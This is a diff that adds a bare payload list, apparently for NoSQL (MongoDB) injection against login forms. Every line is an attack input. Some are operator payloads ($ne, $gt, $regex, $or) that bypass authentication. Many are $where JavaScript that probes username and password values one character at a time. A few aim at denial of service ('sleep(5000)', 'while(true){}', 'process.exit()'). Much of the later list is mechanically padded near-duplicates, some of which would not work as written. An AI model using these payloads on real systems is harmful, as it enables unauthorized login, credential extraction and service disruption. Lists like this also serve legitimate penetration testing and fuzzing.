@@ -1,0 +1,221 @@
+{"username": {"$ne": null}}
+{"password": {"$ne": null}}
+{"username": {"$gt": ""}}
+{"password": {"$gt": ""}}
+{"username": {"$regex": ".*"}}
+{"password": {"$regex": ".*"}}
+{"$where": "1==1"}
+{"username": {"$eq": "admin"}, "password": {"$ne": null}}
+{"$or": [{"username": "admin"}, {"password": "123"}]}
+{"$and": [{"username": "admin"}, {"password": {"$regex": "^.*"}}]}
+{"$nor": [{"username": "not"}, {"password": "not"}]}
+{"$not": {"username": {"$ne": "admin"}}}
+{"$size": 0}
+{"$type": 2}
+{"$elemMatch": {"username": {"$eq": "admin"}}}
+{"$comment": "injection"}
+{"$jsonSchema": {"type": "object", "properties": {"username": {"pattern": ".*"}}}}
+{"$expr": {"$eq": ["$username", "admin"]}}
+{"$function": {"body": "function() { return true; }", "args": []}}
+{"username": {"$in": ["admin", "root"]}}
+{"username": {"$nin": ["guest"]}}
+{"password": {"$exists": true}}
+{"password": {"$mod": [2, 0]}}
+{"$where": "this.username == 'admin'"}
+{"$where": "1===1"}
+{"$where": "typeof this.password == 'string'"}
+{"$where": "function(){ return this._id == ObjectId('...') }"}
+{"$where": "return true"}
+{"$where": "sleep(5000)"}
+{"$where": "while(true){}"}
+{"$where": "process.exit()"}
+{"$where": "eval('1==1')"}
+{"$where": "new Function('return 1==1')()"}
+{"username": {"$regex": "adm[i-n]"}}
+{"username": {"$regex": "^admin$", "$options": "i"}}
+{"password": {"$regex": ".*"}}
+{"$or": [{"username": {"$regex": ".*"}}, {"password": {"$regex": ".*"}}]}
+{"$and": [{"username": {"$ne": "x"}}, {"password": {"$ne": "x"}}]}
+{"$nor": [{"username": {"$eq": "x"}}, {"password": {"$eq": "x"}}]}
+{"username": {"$ne": null, "$type": 2}}
+{"password": {"$gt": "", "$lt": "zzz"}}
+{"$where": "this.username.match(/admin/)"}
+{"$where": "this.password.length > 0"}
+{"$where": "new Date() - this.created < 100000"}
+{"$where": "function(){ return this.role == 'admin'; }"}
+{"$where": "function(){ for(var i in this){ if(i=='password') return true; } return false; }"}
+{"$where": "function(){ return JSON.stringify(this).includes('admin'); }"}
+{"$where": "function(){ return this.username.substring(0,1) == 'a'; }"}
+{"$where": "function(){ return this._id.toString().startsWith('...'); }"}
+{"username": {"$regex": ".*admin.*"}}
+{"password": {"$regex": "^[a-z0-9]+$"}}
+{"$or": [{"username": "admin"}, {"username": {"$regex": ".*"}}]}
+{"$and": [{"username": "admin"}, {"password": {"$ne": "x"}}]}
+{"$where": "function(){ return this.username === 'admin' || this.username === 'root'; }"}
+{"username": {"$regex": "^admin$"}}
+{"password": {"$regex": "^password$"}}
+{"username": {"$ne": "invalid"}}
+{"password": {"$ne": "invalid"}}
+{"username": {"$gt": "a"}}
+{"password": {"$lt": "z"}}
+{"username": {"$gte": "admin"}}
+{"password": {"$lte": "password"}}
+{"username": {"$nin": ["guest", "user"]}}
+{"password": {"$nin": ["123", "456"]}}
+{"username": {"$all": ["admin"]}}
+{"password": {"$all": ["password"]}}
+{"username": {"$in": ["admin", "root", "guest"]}}
+{"password": {"$in": ["password", "123456"]}}
+{"username": {"$regex": "ad.*"}}
+{"password": {"$regex": "pa.*"}}
+{"$or": [{"username": {"$regex": "adm.*"}}, {"password": {"$regex": ".*"}}]}
+{"$and": [{"username": {"$regex": "^admin"}}, {"password": {"$regex": "^pass"}}]}
+{"$nor": [{"username": {"$ne": "admin"}}, {"password": {"$ne": "password"}}]}
+{"$where": "this.username && this.username.startsWith('a')"}
+{"$where": "this.password && this.password.endsWith('word')"}
+{"$where": "this.username.includes('min')"}
+{"$where": "this.password.includes('ss')"}
+{"$where": "this.username.length == 5"}
+{"$where": "this.password.length == 8"}
+{"$where": "this.username.charAt(0) == 'a'"}
+{"$where": "this.password.charAt(0) == 'p'"}
+{"$where": "this.username.substring(0,2) == 'ad'"}
+{"$where": "this.password.substring(0,2) == 'pa'"}
+{"$where": "this.username.substr(0,2) == 'ad'"}
+{"$where": "this.password.substr(0,2) == 'pa'"}
+{"$where": "this.username.slice(0,2) == 'ad'"}
+{"$where": "this.password.slice(0,2) == 'pa'"}
+{"$where": "this.username.toLowerCase() == 'admin'"}
+{"$where": "this.password.toLowerCase() == 'password'"}
+{"$where": "this.username.toUpperCase() == 'ADMIN'"}
+{"$where": "this.password.toUpperCase() == 'PASSWORD'"}
+{"$where": "this.username.match(/^adm/)"}
+{"$where": "this.password.match(/^pass/)"}
+{"$where": "this.username.search('admin') != -1"}
+{"$where": "this.password.search('password') != -1"}
+{"$where": "this.username.indexOf('admin') > -1"}
+{"$where": "this.password.indexOf('password') > -1"}
+{"$where": "this.username.lastIndexOf('admin') > -1"}
+{"$where": "this.password.lastIndexOf('password') > -1"}
+{"$where": "this.username.localeCompare('admin') == 0"}
+{"$where": "this.password.localeCompare('password') == 0"}
+{"$where": "this.username.normalize() == 'admin'"}
+{"$where": "this.password.normalize() == 'password'"}
+{"$where": "this.username.trim() == 'admin'"}
+{"$where": "this.password.trim() == 'password'"}
+{"$where": "this.username.repeat(1) == 'admin'"}
+{"$where": "this.password.repeat(1) == 'password'"}
+{"$where": "this.username.concat('') == 'admin'"}
+{"$where": "this.password.concat('') == 'password'"}
+{"$where": "this.username.split('').join('') == 'admin'"}
+{"$where": "this.password.split('').join('') == 'password'"}
+{"$where": "this.username.replace(/admin/, 'admin') == 'admin'"}
+{"$where": "this.password.replace(/password/, 'password') == 'password'"}
+{"$where": "this.username.padStart(5, 'a') == 'admin'"}
+{"$where": "this.password.padStart(8, 'p') == 'password'"}
+{"$where": "this.username.padEnd(5, 'n') == 'admin'"}
+{"$where": "this.password.padEnd(8, 'd') == 'password'"}
+{"$where": "this.username.valueOf() == 'admin'"}
+{"$where": "this.password.valueOf() == 'password'"}
+{"$where": "this.username.toString() == 'admin'"}
+{"$where": "this.password.toString() == 'password'"}
+{"$where": "this.username.toLocaleString() == 'admin'"}
+{"$where": "this.password.toLocaleString() == 'password'"}
+{"$where": "this.username.toSource() == 'admin'"}
+{"$where": "this.password.toSource() == 'password'"}
+{"$where": "this.username.unwatch() == 'admin'"}
+{"$where": "this.password.unwatch() == 'password'"}
+{"$where": "this.username.watch() == 'admin'"}
+{"$where": "this.password.watch() == 'password'"}
+{"$where": "this.username.__proto__ == Object.prototype"}
+{"$where": "this.password.__proto__ == Object.prototype"}
+{"$where": "this.username.hasOwnProperty('length')"}
+{"$where": "this.password.hasOwnProperty('length')"}
+{"$where": "this.username.isPrototypeOf(Object)"}
+{"$where": "this.password.isPrototypeOf(Object)"}
+{"$where": "this.username.propertyIsEnumerable('length')"}
+{"$where": "this.password.propertyIsEnumerable('length')"}
+{"$where": "this.username.toLocaleLowerCase() == 'admin'"}
+{"$where": "this.password.toLocaleLowerCase() == 'password'"}
+{"$where": "this.username.toLocaleUpperCase() == 'ADMIN'"}
+{"$where": "this.password.toLocaleUpperCase() == 'PASSWORD'"}
+{"$where": "this.username.normalize('NFC') == 'admin'"}
+{"$where": "this.password.normalize('NFC') == 'password'"}
+{"$where": "this.username.normalize('NFD') == 'admin'"}
+{"$where": "this.password.normalize('NFD') == 'password'"}
+{"$where": "this.username.normalize('NFKC') == 'admin'"}
+{"$where": "this.password.normalize('NFKC') == 'password'"}
+{"$where": "this.username.normalize('NFKD') == 'admin'"}
+{"$where": "this.password.normalize('NFKD') == 'password'"}
+{"$where": "this.username.repeat(2) == 'adminadmin'"}
+{"$where": "this.password.repeat(2) == 'passwordpassword'"}
+{"$where": "this.username.concat('extra') == 'adminextra'"}
+{"$where": "this.password.concat('extra') == 'passwordextra'"}
+{"$where": "this.username.split('d') == ['a','min']"}
+{"$where": "this.password.split('s') == ['pa','word']"}
+{"$where": "this.username.replace('d', 'D') == 'aDmin'"}
+{"$where": "this.password.replace('s', 'S') == 'paSword'"}
+{"$where": "this.username.padStart(10, 'x') == 'xxxxxadmin'"}
+{"$where": "this.password.padStart(10, 'x') == 'xxpassword'"}
+{"$where": "this.username.padEnd(10, 'x') == 'adminxxxxx'"}
+{"$where": "this.password.padEnd(10, 'x') == 'passwordxx'"}
+{"$where": "this.username.trimStart() == 'admin'"}
+{"$where": "this.password.trimStart() == 'password'"}
+{"$where": "this.username.trimEnd() == 'admin'"}
+{"$where": "this.password.trimEnd() == 'password'"}
+{"$where": "this.username.trimLeft() == 'admin'"}
+{"$where": "this.password.trimLeft() == 'password'"}
+{"$where": "this.username.trimRight() == 'admin'"}
+{"$where": "this.password.trimRight() == 'password'"}
+{"$where": "this.username.valueOf().length == 5"}
+{"$where": "this.password.valueOf().length == 8"}
+{"$where": "this.username.toString().length == 5"}
+{"$where": "this.password.toString().length == 8"}
+{"$where": "this.username.toLocaleString().length == 5"}
+{"$where": "this.password.toLocaleString().length == 8"}
+{"$where": "this.username.toSource().length == 5"}
+{"$where": "this.password.toSource().length == 8"}
+{"$where": "this.username.unwatch().length == 5"}
+{"$where": "this.password.unwatch().length == 8"}
+{"$where": "this.username.watch().length == 5"}
+{"$where": "this.password.watch().length == 8"}
+{"$where": "this.username.__proto__.toString() == '[object String]'"}
+{"$where": "this.password.__proto__.toString() == '[object String]'"}
+{"$where": "this.username.hasOwnProperty('toString')"}
+{"$where": "this.password.hasOwnProperty('toString')"}
+{"$where": "this.username.isPrototypeOf(String)"}
+{"$where": "this.password.isPrototypeOf(String)"}
+{"$where": "this.username.propertyIsEnumerable('toString')"}
+{"$where": "this.password.propertyIsEnumerable('toString')"}
+{"$where": "this.username.toLocaleLowerCase().length == 5"}
+{"$where": "this.password.toLocaleLowerCase().length == 8"}
+{"$where": "this.username.toLocaleUpperCase().length == 5"}
+{"$where": "this.password.toLocaleUpperCase().length == 8"}
+{"$where": "this.username.normalize('NFC').length == 5"}
+{"$where": "this.password.normalize('NFC').length == 8"}
+{"$where": "this.username.normalize('NFD').length == 5"}
+{"$where": "this.password.normalize('NFD').length == 8"}
+{"$where": "this.username.normalize('NFKC').length == 5"}
+{"$where": "this.password.normalize('NFKC').length == 8"}
+{"$where": "this.username.normalize('NFKD').length == 5"}
+{"$where": "this.password.normalize('NFKD').length == 8"}
+{"$where": "this.username.repeat(2).length == 10"}
+{"$where": "this.password.repeat(2).length == 16"}
+{"$where": "this.username.concat('extra').length == 10"}
+{"$where": "this.password.concat('extra').length == 13"}
+{"$where": "this.username.split('d').length == 2"}
+{"$where": "this.password.split('s').length == 2"}
+{"$where": "this.username.replace('d', 'D').length == 5"}
+{"$where": "this.password.replace('s', 'S').length == 8"}
+{"$where": "this.username.padStart(10, 'x').length == 10"}
+{"$where": "this.password.padStart(10, 'x').length == 10"}
+{"$where": "this.username.padEnd(10, 'x').length == 10"}
+{"$where": "this.password.padEnd(10, 'x').length == 10"}
+{"$where": "this.username.trimStart().length == 5"}
+{"$where": "this.password.trimStart().length == 8"}
+{"$where": "this.username.trimEnd().length == 5"}
+{"$where": "this.password.trimEnd().length == 8"}
+{"$where": "this.username.trimLeft().length == 5"}
+{"$where": "this.password.trimLeft().length == 8"}
+{"$where": "this.username.trimRight().length == 5"}
+{"$where": "this.password.trimRight().length == 8"}
